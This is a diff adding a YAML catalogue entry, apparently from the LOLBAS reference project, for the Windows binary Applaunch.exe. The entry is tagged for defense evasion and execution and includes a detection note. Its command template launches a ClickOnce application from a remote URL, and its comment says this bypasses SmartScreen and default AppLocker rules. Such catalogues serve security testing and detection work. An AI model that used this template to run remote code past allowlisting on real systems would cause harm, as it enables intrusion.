@@ -1,0 +1,31 @@
+id: lolbas/applaunch/awl-bypass/0
+type: binary
+platform: windows
+name: Applaunch.exe
+phases:
+- defense-evasion
+- execution
+capabilities:
+- defense-evasion
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1127.002
+opsec:
+  noise: medium
+  triggers: Applaunch.exe rarely executes unless any ClickOnce partial trusted apps are used. Any use
+    or invocation outside dfsvc.exe with `/activate` should be considered suspicious.
+commands:
+- template: '"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate "{REMOTEURL}#APPLICATION_METADATA_HERE"'
+  comment: Launches a ClickOnce application via `Applaunch.exe`. Bypasses SmartScreen and default AppLocker
+    rules when the application is published as partial trust.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Applaunch/
+tags:
+- windows
+- lolbas
